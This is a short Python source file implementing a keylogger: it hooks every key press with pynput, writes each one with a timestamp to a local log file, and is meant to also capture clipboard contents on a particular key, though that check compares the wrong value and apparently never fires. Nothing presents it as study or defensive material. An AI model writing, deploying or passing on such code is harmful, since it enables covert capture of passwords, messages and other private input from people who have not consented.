import pyperclip
from datetime import datetime
from pynput.keyboard import Listener

KEYSRTOKE_LOG_FILE = './logs/keystroke.log'

def log_key_press(key):
    Key = str(key).replace("'","")
    line_to_write = None
    now = str(datetime.now())

    if key == 'Key.cmd_r':
        line_to_write = f"{now}: Clipboard - {pyperclip.paste()}"
    else:
        line_to_write = f"{now}: Key Press - {Key}"

    with open(KEYSRTOKE_LOG_FILE, 'a') as f:
        f.write(f"{line_to_write} \n")

def start():
    with Listener(on_press=log_key_press) as l:
        l.join()

if __name__ == '__main__':
    start()